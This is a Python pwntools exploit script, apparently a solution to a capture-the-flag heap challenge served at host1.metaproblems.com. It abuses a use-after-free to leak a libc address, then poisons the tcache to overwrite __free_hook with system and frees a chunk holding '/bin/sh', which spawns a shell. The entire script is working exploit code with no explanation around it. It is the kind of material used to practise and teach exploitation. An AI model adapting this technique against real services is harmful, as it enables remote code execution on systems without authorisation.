#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF("uaf_patched")
libc = ELF("./libc.so.6")

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

rop = ROP(exe)

host, port = "host1.metaproblems.com", "5600"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path])

def create(rules):
  sla('> ', '1')
  sa('\n', rules)

def show(idx):
  sla('> ', '2')
  sla('\n', str(idx))

def edit(idx,rules):
  sla('> ', '3')
  sla(':\n', str(idx))
  sa('\n', rules)

def free(idx):
  sla('> ', '4')
  sla(':\n', str(idx))


for i in range(10):
  create('A')

for i in range(8):
  free(7-i)

show(0)
libc.address = u64(rcu(': ', '\n').ljust(8,b'\x00'))-0x3ebca0
logbase()

create('B')
edit(2,p64(libc.sym['__free_hook']))
create('/bin/sh\x00')
create(p64(libc.sym['system']))
free(1)

p.interactive()

